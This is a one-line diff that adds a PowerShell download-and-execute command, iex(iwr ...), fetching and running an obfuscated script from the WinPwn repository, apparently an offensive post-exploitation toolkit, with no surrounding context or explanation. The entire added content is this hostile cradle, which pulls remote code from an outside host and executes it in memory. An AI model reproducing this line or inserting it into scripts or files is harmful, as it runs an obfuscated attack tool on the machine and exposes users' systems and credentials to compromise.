@@ -1,0 +1,1 @@
+iex(iwr -uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/71686975f6794f3acdf350cf76b5f0f3c487d61b/Obfus_SecurePS_WinPwn.ps1')
